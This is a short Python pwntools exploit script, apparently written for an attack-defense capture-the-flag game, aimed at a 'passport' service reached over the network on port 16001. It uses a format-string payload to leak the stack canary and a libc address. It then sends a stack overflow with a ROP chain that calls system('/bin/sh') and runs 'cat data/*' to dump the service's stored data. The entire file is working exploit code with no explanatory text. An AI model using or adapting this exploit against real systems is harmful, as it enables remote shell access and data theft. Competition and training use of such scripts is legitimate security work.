#!/usr/bin/env python3

import sys
from pwn import *
from client.client import *
import time


libc_start_main_offset = 0x2a1ca + 0xc1
system_offset = 0x58740
pop_rdi_ret_offset = 0x10f75b
bin_sh_offset = 0x1cb42f

payload = "%119$p %121$p"
packet = generate_send_packet(Passport(1234, 123456, Date(1, 1, 1999), Date(1, 1, 2000), 1, payload, "aboba", "aboba", "aboba"))

#pr = process('./main')
pr = remote(sys.argv[1], 16001)

#pause()
pr.sendline(packet.serialize())

time.sleep(0.25)
pr.recvuntil(b"passport:")
line_spl = pr.recv().split()
canary, libc = int(line_spl[0], 16), int(line_spl[1], 16) - libc_start_main_offset
#print(hex(libc))

pop_rdi_ret = libc + pop_rdi_ret_offset
ret = pop_rdi_ret + 1
system = libc + system_offset
bin_sh = libc + bin_sh_offset

payload = b'exit\x00'
payload += b'A' * (568 - len(payload))
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh)
payload += p64(system)

#pause()
pr.sendline(payload)
pr.sendline(b"cat data/*")

time.sleep(0.5)
print(pr.recv(), flush=True)

pr.close()
